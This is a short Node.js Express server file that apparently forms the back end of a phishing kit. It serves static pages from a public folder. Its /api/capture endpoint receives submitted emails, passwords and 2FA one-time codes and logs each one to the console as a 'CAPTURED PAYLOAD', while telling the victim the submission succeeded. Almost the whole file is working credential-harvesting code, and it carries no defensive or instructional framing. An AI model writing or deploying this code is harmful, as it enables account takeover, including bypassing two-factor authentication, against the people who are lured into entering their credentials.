const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/capture', (req, res) => {
    const { email, password, otp } = req.body;
    console.log('\n[!] CAPTURED PAYLOAD:');
    if (email) console.log(`[-] Email: ${email}`);
    if (password) console.log(`[-] Password: ${password}`);
    if (otp) console.log(`[-] 2FA Code: ${otp}`);
    console.log('-----------------------------------');
    res.json({ status: 'success' });
});

app.listen(PORT, () => {
    console.log(`[+] Portal active on port ${PORT}`);
});
